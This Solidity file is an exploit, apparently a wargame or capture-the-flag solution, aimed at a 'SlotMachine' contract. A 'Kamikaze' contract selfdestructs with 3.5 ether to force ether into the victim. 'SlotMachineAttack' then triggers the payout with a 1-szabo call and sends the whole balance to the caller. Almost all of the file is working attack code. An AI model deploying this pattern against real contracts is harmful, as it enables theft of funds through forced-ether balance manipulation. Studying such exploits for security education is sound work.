pragma solidity 0.4.24;

contract Kamikaze {

    constructor(address _victim) public payable {
        //require msg.value == 3.5 eth
        selfdestruct(_victim);
    }
}

contract SlotMachineAttack {
    function () external payable {

    }
    function attack(address _victim) public payable returns(bool) {
        (new Kamikaze).value(3.5 ether)(_victim); //creates a new Kamikaze contract with 3.5 eth and push the money to the victim on selfdestruct
        SlotMachine victim = SlotMachine(_victim);
        if (address(victim).call.value(1 szabo)()) {
            msg.sender.transfer(address(this).balance);
            return true;
        }
    }
    function getBalance() external view returns(uint256 my) {
        return address(this).balance;
    }
}